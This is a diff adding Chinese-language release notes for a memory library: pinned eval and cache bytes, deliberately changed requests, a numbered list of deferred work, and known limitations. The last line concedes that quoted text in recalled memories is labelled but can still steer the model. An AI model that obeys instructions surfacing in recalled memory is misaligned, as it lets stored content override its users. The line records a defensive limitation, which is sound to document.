+  - **评测请求、图片请求与发表的数字不变**：`tests/test_eval_leak.py`、`tests/test_frozen_config.py`、`tests/test_llm_client.py` 与 `tests/test_embedding.py` 与这一轮开始时的文件逐字节相同、照常通过，一个都没有重新钉；默认的巩固指纹仍是 `2f0adc7890b6a52e`；发给模型的图片字节由没有改动的 `tests/test_store.py::test_image_bytes_sent_to_models_are_unchanged` 钉住。P10 用缓存离线重建了 6 个评测空间，事实、实体与 LLM 缓存键逐位相同；P6 与 P10 在 414 个评测库里一个会话、一对都不影响。与以前相同，钉住的是请求的字节与缓存键；N2–N11 的重放没有重跑。
+  - **有意改变的请求**：默认配置与评测的路径上没有。产品空间里带几个时间的会话（P6）或只差重音的值（P10）下一次重放时对账的请求可能不同；recall 工具清单的文字变了（P8）；接着做的重建由后台线程发它的抽取请求（P2）。
+  - **留到以后或只做了一部分**：
+    1. D-072 留下的：逐位比对检索之后把下限升到 qdrant-client ≥ 1.20（原子写 `meta.json`）；SQLite 打不开时 `serve`、`proxy`、`chat`、`demo` 与 `mcp` 仍打印调用栈；
+    2. D-072 去掉的提议里仍没做的：`get_all` 的游标分页（P21，这次否掉）、变更流或事件钩子、监控指标的接口与追踪钩子、`/api/v1` 上的实体与图（P19，否掉）、Kubernetes 清单或 Helm chart、异步类专用的线程池、带类型的返回值、TypeScript 客户端包、测试子进程的网络守卫、分段记下进度的遗忘重放，以及幂等的批量导入；
+    3. P3：上限按令牌算，很多令牌加起来仍能占满线程；界面的接口不计数；
+    4. P6：一次多条消息的 `add()` 抽出的事实时间相同，仍按抽取的顺序；
+    5. P18：`MemoryClient` 不用生成的键自动重试；上面 ConcurrentWriteError 的边角情况；`delete_all()` 删整个用户或 `reset()` 之后的重发会再写一次；
+    6. P22：假定一台服务器一个 worker 进程；写在 `CUEMEM_API_KEYS` 里的令牌与 `CUEMEM_API_TOKEN` 改了仍要重启；
+    7. P13：示例没有传 `thread=False`，anthropic 的下限仍是 1.14；
+    8. P14：Python 3.14 下的 Intel Mac 仍装不了 `local`，macOS 13 的 Apple Silicon 也不支持它；3.14 成为主要版本时再看。
+  - **仍有的局限**：
+    - 接手留下的会话、按会话分配序号、删除孤立的向量、reindex 与令牌的重新读入，仍假定一个数据库或一台服务器只有一个进程（同 D-068）；
+    - 召回清单标出了引用的文字，但拦不住模型照着做。
